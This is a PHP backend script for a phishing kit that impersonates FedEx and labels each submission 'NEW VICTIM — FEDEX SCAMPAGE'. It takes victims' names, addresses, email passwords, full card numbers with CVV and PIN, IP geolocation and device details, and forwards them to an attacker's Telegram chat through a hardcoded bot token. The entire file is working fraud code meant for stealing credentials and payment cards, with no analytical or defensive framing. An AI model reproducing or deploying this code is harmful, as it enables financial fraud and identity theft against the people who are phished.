<?php
// ========== CONFIG — PUT YOUR REAL VALUES HERE ==========
define('TELEGRAM_BOT_TOKEN', '8610698068:AAEdeyavRIKq3v-AAS7WGwNpGEHukFm3pTM');
define('TELEGRAM_CHAT_ID', '550480173');
// =======================================================

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Get JSON data from the frontend
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON']);
    exit;
}

// Build the Telegram message
$msg = 
"🚨 NEW VICTIM — FEDEX SCAMPAGE 🚨\n\n" .
"📦 Product: " . ($data['product'] ?? 'iPhone 15 Pro Max') . "\n\n" .
"👤 PERSONAL INFO\n" .
"Name: " . ($data['fullName'] ?? 'N/A') . "\n" .
"Address: " . ($data['address'] ?? 'N/A') . "\n" .
"City: " . ($data['city'] ?? 'N/A') . "\n" .
"State: " . ($data['state'] ?? 'N/A') . "\n" .
"ZIP: " . ($data['zip'] ?? 'N/A') . "\n" .
"Phone: " . ($data['phone'] ?? 'N/A') . "\n" .
"Email: " . ($data['email'] ?? 'N/A') . "\n" .
"Email Password: " . ($data['emailPassword'] ?? 'N/A') . "\n\n" .
"💳 CARD INFO\n" .
"Cardholder: " . ($data['cardHolder'] ?? 'N/A') . "\n" .
"Card Number: " . ($data['cardNumber'] ?? 'N/A') . "\n" .
"Expiry: " . ($data['cardExpiry'] ?? 'N/A') . "\n" .
"CVV: " . ($data['cardCvv'] ?? 'N/A') . "\n" .
"PIN: " . ($data['cardPin'] ?? 'N/A') . "\n\n" .
"🌐 IP & LOCATION\n" .
"IP: " . ($data['ip'] ?? 'N/A') . "\n" .
"Location: " . ($data['city'] ?? 'N/A') . ", " . ($data['region'] ?? 'N/A') . ", " . ($data['country'] ?? 'N/A') . "\n" .
"Coordinates: " . ($data['lat'] ?? 'N/A') . ", " . ($data['lon'] ?? 'N/A') . "\n" .
"ISP: " . ($data['isp'] ?? 'N/A') . "\n" .
"Timezone: " . ($data['timezone'] ?? 'N/A') . "\n\n" .
"📱 DEVICE INFO\n" .
"Device: " . ($data['device'] ?? 'N/A') . "\n" .
"OS: " . ($data['os'] ?? 'N/A') . "\n" .
"Browser: " . ($data['browser'] ?? 'N/A') . "\n" .
"Platform: " . ($data['platform'] ?? 'N/A') . "\n" .
"Screen: " . ($data['screen'] ?? 'N/A') . "\n" .
"Language: " . ($data['language'] ?? 'N/A') . "\n" .
"User-Agent: " . ($data['userAgent'] ?? 'N/A') . "\n\n" .
"⏰ Time: " . ($data['timestamp'] ?? date('Y-m-d H:i:s'));

// Send to Telegram
$telegramUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
$payload = json_encode([
    'chat_id' => TELEGRAM_CHAT_ID,
    'text' => $msg,
    'parse_mode' => 'HTML'
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Return result to frontend
if ($httpCode === 200) {
    echo json_encode(['success' => true, 'message' => 'Data sent to Telegram']);
} else {
    echo json_encode(['success' => false, 'error' => 'Telegram API error', 'http_code' => $httpCode]);
}
?>